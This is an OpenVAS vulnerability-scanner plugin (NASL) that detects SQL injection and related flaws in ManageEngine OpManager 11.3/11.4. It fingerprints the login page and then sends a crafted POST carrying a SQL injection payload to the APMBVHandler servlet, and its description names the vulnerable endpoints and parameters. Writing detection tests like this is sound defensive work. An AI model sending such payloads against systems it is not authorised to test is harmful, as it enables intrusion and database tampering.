###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_manageengine_opmanager_mult_vuln.nasl 3524 2016-06-15 13:10:28Z benallard $
#
# ManageEngine OpManager Multiple Vulnerabilities Nov14
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805103");
  script_version("$Revision: 3524 $");
  script_cve_id("CVE-2014-7866", "CVE-2014-7868", "CVE-2014-6035");
  script_bugtraq_id(71001, 71002);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2016-06-15 15:10:28 +0200 (Wed, 15 Jun 2016) $");
  script_tag(name:"creation_date", value:"2014-11-24 16:16:10 +0530 (Mon, 24 Nov 2014)");
  script_name("ManageEngine OpManager Multiple Vulnerabilities Nov14");

  script_tag(name:"summary", value:"This host is installed with ManageEngine
  OpManager and is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to execute sql query or not.");

  script_tag(name:"insight", value:"Multiple flaws are due to,
  - /servlet/MigrateLEEData script not properly sanitizing user input, specifically
    path traversal style attacks (e.g. '../') supplied via the 'fileName' parameter.
  - /servlet/MigrateCentralData script not properly sanitizing user input, specifically
    path traversal style attacks (e.g. '../') supplied via the 'zipFileName' parameter.
  - /servlet/APMBVHandler script not properly sanitizing user-supplied input
    to the 'OPM_BVNAME' POST parameter.
  - /servlet/DataComparisonServlet script not properly sanitizing user-supplied
    input to the 'query' POST parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers
  to upload arbitrary files and execute the script within the file with the
  privileges of the web server, manipulate SQL queries in the backend database,
  and disclose certain sensitive information.

  Impact Level: Application");

  script_tag(name:"affected", value:"ManageEngine OpManager version 11.3/11.4");

  script_tag(name:"solution", value:"Apply the patch from the given link,
  https://support.zoho.com/portal/manageengine/helpcenter/articles/sql-injection-vulnerability-fix
  https://support.zoho.com/portal/manageengine/helpcenter/articles/fix-for-remote-code-execution-via-file-upload-vulnerability");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/35209");
  script_xref(name : "URL" , value : "https://support.zoho.com/portal/manageengine/helpcenter/articles/sql-injection-vulnerability-fix");
  script_xref(name : "URL" , value : "https://support.zoho.com/portal/manageengine/helpcenter/articles/fix-for-remote-code-execution-via-file-upload-vulnerability");

  script_summary("Check if ManageEngine OpManager is vulnerable to sql injection");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
sndReq = "";
rcvRes = "";
http_port = "";

## Get HTTP Port
http_port = get_http_port(default:80);

host = http_host_name(port:http_port);

## Iterate over possible paths
foreach dir (make_list_unique("/", cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";

  sndReq = http_get(item: string(dir, "/LoginPage.do"),  port:http_port);
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  ## confirm the Application
  if("ManageEngine" >< rcvRes && ">OpManager<" >< rcvRes
      && ("v.11.3<" >< rcvRes || "v.11.4<" >< rcvRes))
  {
    ## Vulnerable URL
    url = dir + "/servlet/APMBVHandler";

    postdata = string("OPERATION_TYPE=Delete&OPM_BVNAME=aaa'; SELECT PG_SLEEP(1)--");

    req = string('POST ', url, ' HTTP/1.1\r\n',
                 'Host: ', host, '\r\n',
                 'Content-Type: application/x-www-form-urlencoded\r\n',
                 'Content-Length: ', strlen(postdata), '\r\n\r\n',
                  postdata);

    ## Send request and receive the response
    res = http_keepalive_send_recv(port:http_port, data:req);

    if("Action=BV_DELETED" >< res && "SELECT PG_SLEEP(1)--" >< res
      && "Result=Success"  >< res && "Result=Failure" >!< res)
    {
      security_message(port:http_port);
      exit(0);
    }
  }
}

exit(99);
